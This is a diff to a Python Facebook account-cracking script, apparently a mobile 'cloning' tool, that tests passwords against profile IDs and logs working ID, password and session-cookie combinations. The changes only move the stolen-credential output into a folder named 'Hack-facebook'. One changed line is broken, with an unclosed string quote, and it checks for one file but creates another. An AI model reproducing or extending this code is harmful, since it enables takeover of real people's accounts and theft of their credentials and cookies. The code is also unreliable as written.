@@ -1909,7 +1909,7 @@ def checker(idf, pwv, index):
 				cp+=1
 				print(f'\r\033[1;91m└──[𝙶𝚊𝚖𝚘𝚞𝚍𝚒-𝐂𝐏] {idf} | {ps}	  \n 𝐋𝐈𝐍𝐊 = https://www.facebook.com/profile.php?id={idf}\n  ')	
 				os.system('espeak -a 300 "  Cp,  Id  "')
-				open('/sdcard/Rayen.Gamoudi-cp.txt','a').write(idf+'|'+ps+'\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'\n')
 			elif 'c_user' in r.cookies.get_dict():
 				ok+=1
 				coki=r.cookies.get_dict()
@@ -1917,8 +1917,8 @@ def checker(idf, pwv, index):
 				print(f'\r\033\n\n[38;5;48m					 \n\n   🆔 :|	 {idf}	   🔑 :|	 {ps} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{kuki} \n𝐋𝐈𝐍𝐊 = https://www.facebook.com/profile.php?id={idf}\n')
 				
 				os.system('espeak -a 300 " Rayen Gamoudi ,Facebook ,  Ok,  id  "')
-				open('/sdcard/Rayen.Gamoudi-ok.txt','a').write(idf+'|'+ps+'|'+kuki+'\n\n')
-				open('/sdcard/udi-ok.txt','a').write(idf+'|'+ps+'\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'\n\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-rOK.txt','a').write(idf+'|'+ps+'\n')
 			else:
 				continue
 		except Exception:
@@ -2520,8 +2520,8 @@ if __name__ == "__main__":
             with open(os.path.join(accounts_folder, 'حسابات-OK.txt'), 'w') as file:
                 file.write("")
 
-        if not os.path.exists(os.path.join(main_folder, 'List-fb.txt')):
-            with open(os.path.join(main_folder, 'List-fb.txt'), 'w') as file:
+        if not os.path.exists(os.path.join(main_folder, 'حسابات-OK.txt')):
+            with open(os.path.join(main_folder, 'حسابات-CP.txt), 'w') as file:
                 file.write("")
 
 
